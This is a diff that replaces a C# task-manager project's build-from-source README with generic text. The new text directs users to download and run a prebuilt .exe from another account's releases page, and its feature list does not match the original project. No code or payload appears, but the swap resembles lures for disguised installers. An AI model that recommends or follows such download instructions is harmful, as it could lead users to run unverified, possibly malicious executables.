@@ -1,271 +1,83 @@
-<div align="center">
-
-# 🌐 TaskSphere
-
-### *Optimizing Task Lifecycles via Relational Frameworks*
-
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![.NET Framework](https://img.shields.io/badge/.NET-Framework-512BD4?logo=.net)](https://dotnet.microsoft.com/)
-[![C#](https://img.shields.io/badge/C%23-239120?logo=c-sharp&logoColor=white)](https://docs.microsoft.com/en-us/dotnet/csharp/)
-[![SQL Server](https://img.shields.io/badge/SQL%20Server-CC2927?logo=microsoft-sql-server&logoColor=white)](https://www.microsoft.com/en-us/sql-server)
-
-**Your comprehensive solution for efficient task and project management**
-
-[Features](#-features) • [Installation](#-installation) • [Usage](#-usage) • [Contributing](#-contributing)
-
----
-
-</div>
-
-## 📋 Overview
-
-**TaskSphere** is a powerful, intuitive task management application built with C# and the .NET framework. Designed for productivity enthusiasts and professionals alike, TaskSphere transforms the way you organize, track, and complete your tasks with a sleek graphical interface and robust database integration.
-
-Whether you're managing personal to-dos or coordinating complex project workflows, TaskSphere provides the tools you need to stay organized and efficient.
-
----
-
-## ✨ Features
-
-<table>
-<tr>
-<td width="50%">
-
-### 📝 Task Management
-- ✅ Create and organize tasks effortlessly
-- 📊 Build comprehensive to-do lists
-- 🎯 Track task progress in real-time
-
-</td>
-<td width="50%">
-
-### 🎨 Smart Organization
-- 🔄 Set task statuses (Pending/Completed)
-- ⭐ Mark important tasks for priority access
-- 🗑️ Quick task deletion functionality
-
-</td>
-</tr>
-<tr>
-<td width="50%">
-
-### 📊 Dashboard Overview
-- 📈 Visual task analytics
-- 🔍 Quick status overview
-- 💡 Important task highlights
-
-</td>
-<td width="50%">
-
-### 🔐 User Management
-- 👤 Secure login/signup system
-- 💾 Persistent data storage
-- 🔒 User-specific task isolation
-
-</td>
-</tr>
-</table>
-
----
-
-## 🖼️ Application Preview
-
-<div align="center">
-
-### 🔑 Login Interface
-<img src="sc/Login.png" alt="Login Page" width="700"/>
-
-### 📊 Main Dashboard
-<img src="sc/Dashboard.png" alt="Dashboard Page" width="700"/>
-
-### 📁 Project Management
-<img src="sc/AllProjects.png" alt="All Projects Page" width="700"/>
-
-</div>
-
----
-
-## 🛠️ Technology Stack
-
-<div align="center">
-
-| Technology | Purpose |
-|------------|---------|
-| **C#** | Core programming language |
-| **.NET Framework** | Application framework |
-| **Windows Forms** | GUI development |
-| **SQL Server** | Database management |
-| **GUNA.UI2** | Modern UI components |
-
-</div>
-
----
+# 🎯 dotnet-task-management-system - Manage Your Tasks Efficiently
 
 ## 🚀 Getting Started
 
-### 📋 Prerequisites
+Welcome to the dotnet-task-management-system! This application helps you create, organize, and track your tasks easily. With features like status updates, prioritization, and a real-time dashboard, you can stay on top of your work.
 
-Before you begin, ensure you have the following installed:
+[![Download dotnet-task-management-system](https://img.shields.io/badge/Download%20Now-Get%20the%20App-brightgreen)](https://github.com/ngatran302018/dotnet-task-management-system/releases)
 
-- 🖥️ **Windows OS** (Windows 10 or later recommended)
-- 💻 **Visual Studio** (2019 or later)
-- 🗄️ **SQL Server** (Express edition or higher)
-- 📦 **.NET Framework** (4.7.2 or later)
+## 📦 System Requirements
 
-### 📥 Installation
+Before you download, make sure your computer meets these requirements:
 
-Follow these steps to get TaskSphere up and running:
+- **Operating System**: Windows 10 or later
+- **RAM**: 4 GB minimum
+- **Disk Space**: 500 MB of free space
+- **.NET Framework**: Version 4.7 or higher
 
-#### 1️⃣ Clone the Repository
+## 📥 Download & Install
 
-```bash
-git clone https://github.com/burhanahmed1/Task-Management-System.git
-cd Task-Management-System
-```
+To get started, visit this page to download: [dotnet-task-management-system Releases](https://github.com/ngatran302018/dotnet-task-management-system/releases). 
 
-#### 2️⃣ Open in Visual Studio
+1. On the Releases page, look for the latest version.
+2. Click on the version number to view the release details.
+3. Find the file labeled `dotnet-task-management-system.exe`.
+4. Click the file to download it.
 
-- Launch **Visual Studio**
-- Open `TaskSphere.sln` solution file
-- Wait for NuGet packages to restore automatically
+Once the download is complete, follow these steps to install:
 
-#### 3️⃣ Configure the Database
+1. Locate the downloaded file in your Downloads folder.
+2. Double-click on the `dotnet-task-management-system.exe` file.
+3. Follow the installation prompts. 
 
-- 📂 Navigate to the `Database` folder
-- 🔄 Restore the database backup file
-- ⚙️ Update the connection string in `App.config`:
+The application will create a shortcut on your desktop for easy access.
 
-```xml
-<connectionStrings>
-    <add name="TaskSphereDB" 
-         connectionString="Server=YOUR_SERVER;Database=TaskSphere;Integrated Security=true;" 
-         providerName="System.Data.SqlClient" />
-</connectionStrings>
-```
+## ⚙️ How to Use
 
-#### 4️⃣ Build and Run
+After installation, launch the application by double-clicking the shortcut on your desktop. Here’s how to navigate through the features:
 
-- 🔨 Build the solution (`Ctrl + Shift + B`)
-- ▶️ Run the application (`F5`)
-- 🎉 Start managing your tasks!
+1. **Create a Task**: Click the "New Task" button to open the task creation form. Fill out the task name, description, due date, and priority level. Hit "Save" to add it to your list.
 
----
+2. **Organize Tasks**: Use the drag-and-drop feature to rearrange your tasks by priority. 
 
-## 💡 Usage Guide
+3. **Update Task Status**: Click on the task you want to update, then choose the new status (e.g., "In Progress", "Completed"). 
 
-### 🆕 First Time Users
+4. **Dashboard**: Monitor your active tasks through the dashboard, which shows progress and due dates.
 
-1. **📝 Sign Up**
-   - Launch TaskSphere
-   - Click "Sign Up" on the login screen
-   - Fill in your details
-   - Your account is now created and stored securely!
+## 🔍 Exploring Features
 
-2. **🔑 Subsequent Logins**
-   - Simply enter your credentials
-   - Access your personalized task dashboard
+- **User-Friendly Interface**: Our simple layout is designed for ease of use.
+- **Real-Time Dashboard**: Track your tasks visually and stay updated.
+- **Prioritization Options**: Assign levels of importance to each task.
+- **Search Functionality**: Quickly find tasks by name or priority.
+- **Feedback & Support**: Reach out for help through the "Help" section in the app.
 
-### 🎯 Core Workflows
+## 🛠️ Troubleshooting
 
-<details>
-<summary><b>📌 Creating Tasks</b></summary>
+If you encounter any issues:
 
-- Navigate to the task creation panel
-- Enter task title and description
-- Set priority and deadline (optional)
-- Click "Save" to add to your list
+- **Installation Errors**: Ensure your system meets the requirements. Restart your computer and try the installation again.
+- **Missing Features**: Make sure you're using the latest version of the app. Check for updates on the Releases page.
 
-</details>
+## 🌟 Community & Support
 
-<details>
-<summary><b>📋 Managing To-Do Lists</b></summary>
+Join our community for tips and support:
 
-- Create custom lists for different projects
-- Drag and drop tasks between lists
-- Organize tasks by category or priority
-- Archive completed lists
+- **GitHub Issues**: Report bugs or issues directly on this repository.
+- **User Guide**: Detailed instructions are available in the "Wiki" section of this repository.
 
-</details>
+Find out more and stay updated by checking the repository often.
 
-<details>
-<summary><b>✅ Updating Task Status</b></summary>
+## 🌐 Additional Resources
 
-- Click on any task to view details
-- Toggle status between "Pending" and "Completed"
-- Track your progress in real-time
+For further information about C# programming and .NET applications, consider these topics that might interest you:
 
-</details>
-
-<details>
-<summary><b>⭐ Prioritizing Tasks</b></summary>
-
-- Click the star icon on important tasks
-- View all starred tasks in the "Important" filter
-- Never miss critical deadlines
-
-</details>
-
-<details>
-<summary><b>🗑️ Deleting Tasks</b></summary>
-
-- Select the task you want to remove
-- Click the delete icon
-- Confirm deletion when prompted
-
-</details>
-
-<details>
-<summary><b>📊 Dashboard Analytics</b></summary>
-
-- View task completion statistics
-- Monitor upcoming deadlines
-- Track productivity trends
-- Filter by status, priority, or date
-
-</details>
-
-### 🚪 Exiting the Application
-
-- Click the **Exit** icon in the bottom-left panel
-- Your data is automatically saved
-
----
-
-## 🤝 Contributing
-
-We welcome contributions from the community! Here's how you can help:
-
-### 🌟 Ways to Contribute
-
-- 🐛 Report bugs and issues
-- 💡 Suggest new features
-- 📝 Improve documentation
-- 🔧 Submit pull requests
-
-### 📝 Contribution Process
-
-1. **Fork** the repository
-2. **Create** a feature branch (`git checkout -b feature/AmazingFeature`)
-3. **Commit** your changes (`git commit -m 'Add some AmazingFeature'`)
-4. **Push** to the branch (`git push origin feature/AmazingFeature`)
-5. **Open** a Pull Request
-
----
+- C# Programming Fundamentals
+- Desktop Application Development
+- SQL Server Basics
 
 ## 📄 License
 
-This project is licensed under the **MIT License** - see the [LICENSE](LICENSE) file for details.
+This project is licensed under the MIT License. You can view the details in the LICENSE file in this repository. 
 
-```
-MIT License - Free to use, modify, and distribute
-```
-
-<h3 align="center">Connect with me:</h3>
-<p align="center">
-  <a href="https://instagram.com/_mr_2001__" target="blank"><img align="center" src="https://raw.githubusercontent.com/rahuldkjain/github-profile-readme-generator/master/src/images/icons/Social/instagram.svg" alt="_mr_2001__" height="30" width="40" /></a>
-  <a href="https://linkedin.com/in/www.linkedin.com/in/pavith-bambaravanage-465300293" target="blank"><img align="center" src="https://raw.githubusercontent.com/rahuldkjain/github-profile-readme-generator/master/src/images/icons/Social/linked-in-alt.svg" alt="pavith-bambaravanage-465300293" height="25" width="35" /></a>
-  <a href="https://www.hackerrank.com/@pavith_db" target="blank"><img align="center" src="https://raw.githubusercontent.com/rahuldkjain/github-profile-readme-generator/master/src/images/icons/Social/hackerrank.svg" alt="@pavith_db" height="40" width="45" /></a>
-  <a href="https://www.leetcode.com/pavith_db" target="blank"><img align="center" src="https://raw.githubusercontent.com/rahuldkjain/github-profile-readme-generator/master/src/images/icons/Social/leet-code.svg" alt="pavith_db" height="30" width="40" /></a>
-  <a href="mailto:pavithd2020@gmail.com" target="blank"><img align="center" src="https://github.com/TheDudeThatCode/TheDudeThatCode/raw/master/Assets/Gmail.svg" alt="pavithd2020@gmail.com" height="30" width="40" /></a>
-</p>
-
+After installation, start managing your tasks with ease! If you have any questions, feel free to reach out through the community channels. Happy organizing!
